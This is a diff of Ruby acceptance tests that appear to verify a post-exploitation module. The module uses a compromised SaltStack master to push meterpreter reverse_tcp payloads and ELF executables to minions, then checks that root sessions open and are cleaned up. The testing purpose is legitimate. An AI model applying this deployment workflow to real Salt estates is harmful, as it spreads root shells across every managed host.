@@ -19,37 +19,6 @@ module Acceptance
       Timeout.timeout(seconds) { wait_for_expect(seconds, 1, &block) }
     end
 
-    def dx_master_cli_control(identifier)
-      source = "/tmp/module-target-deployer-cli-source-#{SecureRandom.hex(8)}"
-      value = "native-cli-#{SecureRandom.hex(12)}"
-      destinations = %w[legacy argv].to_h { |method| [method, "/tmp/module-target-deployer-cli-#{method}-#{SecureRandom.hex(8)}"] }
-      target_exec('master', 'python', '-c', 'from pathlib import Path;import sys;Path(sys.argv[1]).write_text(sys.argv[2])', source, value)
-      destinations.each do |method, destination|
-        invocation = if method == 'legacy'
-                       "owner.cmd_exec(#{"salt-cp '*' '#{source}' '#{destination}'".inspect})"
-                     else
-                       "owner.create_process('salt-cp',args: ['*',#{source.inspect},#{destination.inspect}],time_out: 120)"
-                     end
-        expression = "begin; owner=framework.modules.create(#{DEPLOY_OWNER.inspect}); owner.datastore['SESSION']=#{identifier}; started=Process.clock_gettime(Process::CLOCK_MONOTONIC); output=#{invocation}; {output_base64: Base64.strict_encode64(output),seconds: Process.clock_gettime(Process::CLOCK_MONOTONIC)-started}; rescue StandardError => error; {error: error.class.name,message: error.message}; end"
-        code = "puts 'SALT_JSON=' + (#{expression}).to_json"
-        result = sx_document(console_command("irb -e #{code.inspect}", timeout: 150), 'SALT_JSON=')
-        files = %w[master minion_a minion_b].to_h do |service|
-          code = 'import hashlib,json,pathlib,sys;p=pathlib.Path(sys.argv[1]);print(json.dumps({"sha256":hashlib.sha256(p.read_bytes()).hexdigest(),"bytes":p.stat().st_size} if p.exists() else None))'
-          [service, JSON.parse(target_exec(service, 'python', '-c', code, destination))]
-        end
-        sx_record('master-session-cli-controls.jsonl', workspace: @workspace, session: identifier, method: method, result: result, files: files)
-        next unless method == 'argv'
-
-        expect(result).not_to have_key('error')
-        expect(files.fetch('master')).to be_nil
-        %w[minion_a minion_b].each { |service| expect(files.fetch(service)).to eq('sha256' => Digest::SHA256.hexdigest(value), 'bytes' => value.bytesize) }
-      end
-    ensure
-      if source && destinations
-        %w[master minion_a minion_b].each { |service| target_exec(service, 'rm', '-f', source, *destinations.values) }
-      end
-    end
-
     def dx_native(phase)
       output = +''
       argv = ['python3', 'test/module_targets/saltstack_deployer/native_probe.py', ENV.fetch('MODULE_TARGET_RUNTIME'), phase]
@@ -93,6 +62,7 @@ module Acceptance
         proof = sx_json("SaltDeploymentSessionControl.proof(framework,#{identifier},#{path.inspect},#{value.inspect})")
         expect(proof.fetch('container_role')).to eq(@native.fetch('identities').fetch(role).fetch('state'))
         expect(proof.fetch('via_exploit')).to eq(owner)
+        expect(proof.fetch('raw_command_output').lines.last.strip).to eq('0') if proof.fetch('type') == 'shell'
         expect(proof.fetch('peer').split(':').first).to eq(@native.fetch('addresses').fetch(role).fetch('address'))
         expect(target_exec(service, 'cat', path)).to eq(value)
         expect(target_exec(service, 'stat', '-c', '%u', path).strip).to eq('0')
@@ -102,7 +72,13 @@ module Acceptance
           target_exec(entry.fetch('service'), 'test', '!', '-e', path)
         end
         pids = proof.fetch('type') == 'meterpreter' ? [proof.fetch('pid')] : [Integer(proof.fetch('command_pid'))]
-        pids.each { |pid| expect(target_exec(service, 'cat', "/proc/#{pid}/status")).to match(/^Uid:\s+0\s+0\s+0\s+0$/) }
+        processes = dx_processes(service, pids)
+        expect(processes.keys.sort).to eq(pids.map(&:to_s).sort)
+        processes.each_value do |process|
+          expect(process.fetch('uid')).to eq(0)
+          expect(process.fetch('state')).not_to eq('Z')
+        end
+        proof['native_processes'] = processes
         proof['target_pids'] = pids
         proof['service'] = service
         @deployment_proofs[identifier] = proof
@@ -112,6 +88,10 @@ module Acceptance
       ensure
         target_exec(service, 'rm', '-f', path)
       end
+    end
+
+    def dx_processes(service, pids)
+      JSON.parse(target_exec(service, 'python', '-c', File.read('test/module_targets/saltstack_deployer/processes.py'), *pids.map(&:to_s)))
     end
 
     def dx_master(payload)
@@ -126,8 +106,7 @@ module Acceptance
       identifier
     end
 
-    def dx_native_elf(architecture)
-      payload = "linux/#{architecture}/meterpreter/reverse_tcp"
+    def dx_native_elf(payload)
       job = dx_handler(payload, NATIVE_PORT)
       generated = sx_json("SaltDeploymentSessionControl.executable(framework.jobs.fetch(#{job.inspect}),#{payload.inspect},framework)")
       identifier = SecureRandom.hex(8)
@@ -140,6 +119,18 @@ module Acceptance
       expect(launch.fetch('status')).to eq('native_elf_dispatched')
       session = dx_ready('exploit/multi/handler', 1).fetch(0)
       dx_proof(session, 'minion-a', owner: 'exploit/multi/handler')
+      executable = Base64.strict_decode64(generated.fetch('executable_base64'))
+      encoded = Base64.strict_encode64(executable)
+      expect(target_exec('master', 'sha256sum', paths.fetch('source')).split.first).to eq(Digest::SHA256.hexdigest(encoded))
+      code = 'import hashlib,json,pathlib,sys;p=pathlib.Path(sys.argv[1]);raw=p.read_bytes();print(json.dumps({"sha256":hashlib.sha256(raw).hexdigest(),"bytes":len(raw),"mode":oct(p.stat().st_mode&511),"elf_class":raw[4],"elf_machine":int.from_bytes(raw[18:20],"little")}))'
+      actual = JSON.parse(target_exec('minion_a', 'python', '-c', code, paths.fetch('destination')))
+      expect(actual).to eq('sha256' => generated.fetch('executable_sha256'), 'bytes' => executable.bytesize,
+                           'mode' => '0o755', 'elf_class' => payload.start_with?('linux/x64/') ? 2 : 1,
+                           'elf_machine' => payload.start_with?('linux/x64/') ? 62 : 3)
+      expect(target_exec('minion_a', 'sha256sum', paths.fetch('destination') + '.b64').split.first).to eq(Digest::SHA256.hexdigest(encoded))
+      %w[master minion_b].each { |service| target_exec(service, 'test', '!', '-e', paths.fetch('destination')) }
+      target_exec('minion_b', 'test', '!', '-e', paths.fetch('destination') + '.b64')
+      sx_record('native-elf-file-proofs.jsonl', workspace: @workspace, payload: payload, files: actual)
     ensure
       if paths
         target_exec('master', 'rm', '-f', paths.fetch('source'))
@@ -147,11 +138,12 @@ module Acceptance
       end
     end
 
-    def dx_owner(initial)
+    def dx_owner(initial, payload:, selector:, calculate:)
       @deployment_directory = "/tmp/module-target-owner-deployer-#{SecureRandom.hex(8)}"
       %w[master minion_a minion_b].each { |service| target_exec(service, 'mkdir', '-m', '700', @deployment_directory) }
       output = run_target_module(DEPLOY_OWNER, 'master', {
-        'SESSION' => initial, 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
+        'SESSION' => initial, 'PAYLOAD' => payload,
+        'MINIONS' => selector, 'CALCULATE' => calculate,
         'LHOST' => listener_host, 'LPORT' => OWNER_PORT, 'ListenerTimeout' => 5,
         'WritableDir' => @deployment_directory, 'TargetWritableDir' => @deployment_directory
       }, action: 'run -j -z', allow_errors: true, endpoint_options: {}, command_timeout: 60)
@@ -162,25 +154,29 @@ module Acceptance
       full = console_command('sessions -l') + console.all_data
       sx_record('owning-completion.jsonl', workspace: @workspace, output: full.dup.force_encoding(Encoding::UTF_8))
       expect(full).not_to match(/undefined local variable|undefined method|Exception in on_new_session|Exploit failed|Msf::OptionValidateError/)
-      identifiers = dx_ready(DEPLOY_OWNER, 2)
+      expected_roles = selector == '*' ? %w[minion-a minion-b] : ['minion-a']
+      identifiers = dx_ready(DEPLOY_OWNER, expected_roles.length)
       identifiers.each do |identifier|
         row = sx_json("SaltDeploymentSessionControl.role(framework,#{identifier})")
         dx_proof(identifier, row.fetch('role'), owner: DEPLOY_OWNER)
       end
-      expect(identifiers.map { |identifier| @deployment_proofs.fetch(identifier).fetch('container_role').fetch('role') }.sort).to eq(%w[minion-a minion-b])
+      expect(identifiers.map { |identifier| @deployment_proofs.fetch(identifier).fetch('container_role').fetch('role') }.sort).to eq(expected_roles)
     end
 
     def dx_cleanup
       errors = []
       begin
-        console_command('jobs -K')
         console_command('sessions -K')
+        # Passive HTTP sessions need their live listener to deliver shutdown.
+        console_command('jobs -K')
         dx_poll(30) { expect(sx_json('framework.sessions.keys')).to eq([]) }
         dx_poll(30) { expect(sx_json('framework.jobs.keys')).to eq([]) }
         @deployment_proofs&.each_value do |proof|
           dx_poll(30) do
-            code = 'import json,pathlib,sys;print(json.dumps([pid for pid in sys.argv[1:] if pathlib.Path("/proc",pid).exists()]))'
-            expect(JSON.parse(target_exec(proof.fetch('service'), 'python', '-c', code, *proof.fetch('target_pids').map(&:to_s)))).to eq([])
+            processes = dx_processes(proof.fetch('service'), proof.fetch('target_pids'))
+            remaining = processes.select { |pid, row| row.fetch('starttime') == proof.fetch('native_processes').fetch(pid).fetch('starttime') }
+            sx_record('session-process-closure.jsonl', workspace: @workspace, session: proof.fetch('id'), service: proof.fetch('service'), remaining: remaining)
+            expect(remaining).to eq({})
           end
         end
         dx_poll(30) do
@@ -190,6 +186,15 @@ module Acceptance
         code = 'require "json";ports=ARGV.map(&:to_i);puts JSON.generate(%w[/proc/net/tcp /proc/net/tcp6].flat_map{|path|File.readlines(path).drop(1).map(&:split)}.select{|row|row[3]=="0A"&&ports.include?(row[1].split(":").last.to_i(16))})'
         dx_poll(30) do
           expect(JSON.parse(target_exec('framework', 'ruby', '-e', code, INITIAL_PORT.to_s, OWNER_PORT.to_s, NATIVE_PORT.to_s))).to eq([])
+        end
+        %w[master minion_a minion_b].each do |service|
+          [INITIAL_PORT, OWNER_PORT, NATIVE_PORT].each do |port|
+            dx_poll(20) do
+              sockets = JSON.parse(target_exec(service, 'python', '-c', File.read('test/module_targets/superset_rce_owner/connection_state.py'), listener_host, port.to_s))
+              sx_record('session-socket-closure.jsonl', workspace: @workspace, service: service, port: port, sockets: sockets)
+              expect(sockets.reject { |socket| socket.fetch('state') == '06' }).to eq([])
+            end
+          end
         end
       rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
         errors << e
